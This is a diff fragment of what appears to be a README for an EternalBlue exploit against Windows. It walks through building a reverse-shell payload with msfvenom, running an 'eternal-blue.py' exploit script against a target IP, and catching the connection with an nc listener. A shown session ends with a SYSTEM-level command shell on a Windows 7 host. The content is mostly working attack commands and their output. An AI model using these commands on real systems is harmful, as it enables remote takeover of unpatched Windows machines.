@@ -40,5 +40,19 @@ msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=127.0.0.1 --platform windo
 
 ```
 python3 eternal-blue.py TARGET-IP final.bin
-in other term open the nc to recive the connection
 ```
+
+Open NC and wait the connection
+
+```
+$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [0.0.0.0] from (UNKNOWN) [0.0.0.0] 49191
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
